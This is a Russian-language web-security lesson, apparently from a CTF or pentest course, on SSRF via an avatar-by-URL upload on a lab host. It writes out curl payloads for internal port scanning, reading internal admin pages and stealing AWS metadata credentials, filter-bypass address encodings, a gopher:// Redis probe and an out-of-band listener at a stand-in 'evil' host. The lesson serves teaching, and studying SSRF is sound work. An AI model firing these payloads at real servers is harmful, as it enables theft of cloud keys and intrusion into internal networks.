У `shop.local` есть кнопка «загрузить аватар по ссылке»: ты вставляешь URL картинки, а сервер сам скачивает её и сохраняет. Удобно. Но что, если вместо картинки подставить адрес внутреннего сервиса, которого из интернета не видно? Сервер послушно сходит туда и принесёт ответ. Это и есть **SSRF** — Server-Side Request Forgery, «подделка запроса на стороне сервера».

В этом уроке мы возьмём эту кнопку и пройдём путь от безобидного URL до внутренних сервисов и облачных секретов.

## Наш пример: загрузка аватара по ссылке

Форма отправляет такой запрос:

```bash
$ curl -s 'https://shop.local/profile/avatar' -d 'url=https://example.com/pic.png'
{"status":"ok","saved":"/uploads/avatar_7f3a.png"}
```

Сервер сходил по нашему URL, скачал файл и сохранил. Ключевой вопрос: **куда ещё** он может сходить? Внутренние адреса (`127.0.0.1`, `10.x.x.x`) обычно закрыты из интернета, но сервер находится внутри сети и видит их.

## Шаг 1: проверяем, ходит ли сервер по нашим URL

Сначала убедимся, что запрос реально уходит. Подставим адрес локального сервиса — часто на `127.0.0.1` крутится что-то служебное:

```bash
$ curl -s 'https://shop.local/profile/avatar' -d 'url=http://127.0.0.1:8080/'
{"error":"not an image"}          # сервер достучался, но ответ не картинка
$ curl -s 'https://shop.local/profile/avatar' -d 'url=http://127.0.0.1:9999/'
{"error":"connection refused"}    # порт закрыт
```

Разница между «not an image» и «connection refused» — уже разведка: по ней видно, **какие порты открыты** внутри. Это называется SSRF-as-portscan (сканирование портов через SSRF).

## Шаг 2: заглядываем на внутренние сервисы

На `127.0.0.1:8080` что-то есть. Попробуем прочитать его ответ. Проблема: сервер проверяет, что скачал картинку. Обойдём это, попросив файл с картинкой из внутреннего сервиса, либо посмотрим на ошибку, которая цитирует ответ:

```bash
$ curl -s 'https://shop.local/profile/avatar' -d 'url=http://127.0.0.1:8080/admin'
{"error":"invalid image header: <html><title>Admin</title>... <a href=\"/debug\">"}
```

Даже в сообщении об ошибке видно кусок внутренней страницы `/admin`. Если приложение отдаёт содержимое (in-band SSRF), читаем целиком; если нет (blind SSRF) — подтверждаем по времени или через внешний коллаборатор (сервер обращается к нашему хосту).

## Шаг 3: облачные метаданные — главная цель

В облаке (AWS/GCP/Azure) у каждой виртуальной машины есть служебный адрес `169.254.169.254`, где лежат **метаданные** — сведения о роли, а иногда и временные ключи доступа. Через SSRF мы просим сервер сходить туда:

```bash
$ curl -s 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
{"error":"... shop-ec2-role ..."}
$ curl -s 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role'
{"error":"... \"AccessKeyId\":\"ASIA...\", \"SecretAccessKey\":\"...\", \"Token\":\"...\" ..."}
```

Мы получили временные AWS-ключи роли. С ними можно войти в облачный аккаунт и, если роль широкая, захватить инфраструктуру. Это самая дорогая находка класса SSRF — детали в уроке `web-ssrf-cloud-deep`.

## Шаг 4: обходы фильтров

Разработчики догадываются о риске и запрещают `127.0.0.1` или `169.254.169.254`. Простые фильтры обходятся:

```bash
http://127.1/                      # сокращённая запись
http://2130706433/                 # IP как одно число
http://0x7f000001/                 # hex
http://[::1]/                      # IPv6 loopback
http://127.0.0.1.nip.io/           # домен, который резолвится в 127.0.0.1
http://allowed.com@127.0.0.1/      # userinfo перед хостом
```

Смысл тот же, что и в traversal: фильтр проверяет **строку**, а сетевой стек использует **нормализованный адрес**. Где расхождение — там обход. Отдельный сильный приём — **DNS rebinding**, ему посвящён свой урок.

## Шаг 5: не только HTTP — протокольная контрабанда

SSRF-ручка может поддерживать разные схемы. Если доступна `gopher://`, можно слать **произвольные байты** на внутренний сервис — например, команды Redis:

```bash
$ curl -s 'https://shop.local/profile/avatar' -d 'url=gopher://127.0.0.1:6379/_INFO'
{"error":"... redis_version:7.0.5 ..."}
```

Так SSRF превращается в RCE: Redis умеет писать файлы на диск. Подробности — в `web-ssrf-protocol-smuggling`. Полезны и `file://` (чтение файлов), `dict://` (простые протоколы).

## Шаг 6: как подтвердить blind SSRF

Если ответа от внутреннего сервиса не видно, доказать SSRF можно двумя способами:

- **Out-of-band:** дать URL на наш сервер (Burp Collaborator или `nc -lvnp 80`) и увидеть входящее соединение.
- **По времени:** если внутренний адрес недоступен, запрос «висит» дольше; по задержке различают открытые и закрытые порты.

```bash
$ nc -lvnp 80
GET /probe HTTP/1.1
Host: our-listener.evil
```
Входящий запрос от сервера — доказательство.

## Шаг 7: куда ещё ведёт SSRF

Метаданные — не единственная цель. Внутри сети через SSRF обычно доступны:

- **админ-панели** и служебные интерфейсы (`http://127.0.0.1:8080/admin`, `/debug`, `/metrics`);
- **внутренние API** без аутентификации — часто они «доверяют» сети и не проверяют токены;
- **базы и кэши** (Redis, Memcached, Elasticsearch) — на них атакуют через `gopher://`;
- **серверы оркестрации** — `http://kubernetes.default.svc/` и kubelet на `:10250`;
- **другие машины** во внутренней подсети — SSRF работает как сканер портов и проводник.

Поэтому SSRF считают «пропуском во внутреннюю сеть»: снаружи ты не видишь ни один из этих сервисов, а сервер видит все. Отдельная ценность — возможность обойти сетевые ACL: серверу разрешено то, что запрещено тебе.

## Шаг 8: чем отличается SSRF от обычного запроса

Ключевое отличие в том, **кто** отправляет запрос. Когда ты открываешь URL в браузере, запрос идёт с твоего IP и подчиняется твоим сетевым правилам. При SSRF запрос отправляет **сервер** — с его IP, из его сети, с его правами. Если сервер доверяет «своим» адресам (а внутренние сервисы обычно доверяют), он охотно отдаёт то, что тебе снаружи недоступно. Именно поэтому фильтрация URL по строке ненадёжна: важно не то, что написано в строке, а то, куда реально уйдёт запрос после резолва DNS и разбора URL.

## Шаг 9: почему SSRF так дорого стоит

Представь, что через загрузку аватара ты получил ключи роли с правом читать S3-бакеты. Это уже утечка всех файлов компании. А если роль позволяет менять IAM — захват всего облачного аккаунта. Внутренние API через SSRF часто открывают доступ к данным, которые снаружи защищены логином: сервер считает, что раз запрос пришёл изнутри, он «свой». Поэтому в отчётах SSRF к метаданным и внутренним админкам оценивают как P1/critical, а blind SSRF — как минимум high. Уязвимость не «читает одну страницу» — она открывает целый сегмент сети.

## Что мы теперь знаем

- **SSRF** — заставляем сервер обратиться по нашему URL.
- Цель: внутренние сервисы (`127.0.0.1`, `10.x`), админки, облачные метаданные.
- In-band — видим ответ; blind — подтверждаем OOB или по времени.
- Обходы allowlist: сокращённые/hex/decimal IP, `nip.io`, `@`, IPv6.
- `gopher://` даёт произвольные байты → атаки на Redis/FastCGI → RCE.

## На что смотреть дальше

- **Функции-кандидаты:** импорт по URL, вебхуки, превью ссылок, генерация PDF/скриншотов, SSO/JWKS-fetch.
- **Что искать внутри:** `http://localhost/`, `http://169.254.169.254/`, `http://kubernetes.default.svc/`.
- **Редиректы:** если ручка следует `302`, наш сервер может перенаправить её на внутренний адрес в обход фильтра.
- **Методы:** иногда внутренняя ручка ждёт не `GET`, а `PUT`/`POST` — попробуй передать метод и тело.

## Куда дальше

Мы научились ходить по внутренним адресам. Но XML-парсеры умеют делать то же самое — и даже больше: читать локальные файлы через «сущности». В следующем уроке разберём **XXE**: как безобидный XML-импорт превращается в чтение `/etc/passwd` и SSRF. А пока запомни: **если сервер ходит по нашему URL — фильтруй, резолвь и проверяй адрес после нормализации, а метаданные закрывай.**

## Где пригодится

- **CTF (Web):** SSRF — путь к внутренним сервисам и облачным метаданным; часто финальный шаг к флагу/токенам.
- **Bug bounty:** SSRF к metadata/внутренним сервисам — critical (P1); blind SSRF тоже ценится.
- **Пентест:** SSRF — ключевой вектор для пивота во внутреннюю сеть из периметра.
- **Работа (AppSec):** whitelisting URL, запрет метаданных, IMDSv2, изоляция исходящего трафика — меры против SSRF.
